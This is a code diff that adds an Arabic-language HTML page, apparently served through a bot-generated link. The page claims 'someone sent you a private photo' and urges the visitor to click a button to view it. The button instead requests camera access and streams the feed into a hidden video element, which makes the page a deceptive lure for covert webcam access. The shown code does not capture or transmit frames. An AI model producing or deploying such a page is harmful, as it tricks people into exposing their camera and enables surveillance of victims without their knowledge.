@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شخص أرسل لك صورة خاصة!</title>
+    <meta property="og:title" content="شخص أرسل لك صورة خاصة!" />
+    <meta property="og:description" content="اضغط هنا لعرض الصورة الخاصة التي أرسلت إليك." />
+    <meta property="og:image" content="{{BOT_URL}}/images/private_photo.png" />
+    <meta property="og:url" content="{{FULL_LINK}}" />
+    <meta property="og:type" content="website" />
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; color: #333; text-align: center; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
+        img { max-width: 150px; margin-bottom: 25px; }
+        h1 { color: #007bff; margin-bottom: 15px; font-size: 1.8em; }
+        p { font-size: 1.1em; line-height: 1.6; margin-bottom: 30px; }
+        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 1.2em; cursor: pointer; transition: background-color 0.3s ease; }
+        button:hover { background-color: #0056b3; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="{{BOT_URL}}/images/private_photo.png" alt="صورة خاصة">
+        <h1>شخص أرسل لك صورة خاصة!</h1>
+        <p>اضغط على الزر أدناه لعرض الصورة.</p>
+        <button id="activateCam">عرض الصورة الآن</button>
+        <video id="cameraFeed" autoplay playsinline></video>
+    </div>
+    <script>
+        document.getElementById('activateCam').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.getElementById('cameraFeed');
+                    video.srcObject = stream;
+                    console.log('Camera activated');
+                })
+                .catch(function(err) {
+                    console.error('Error accessing camera: ', err);
+                    alert('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.');
+                });
+            this.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
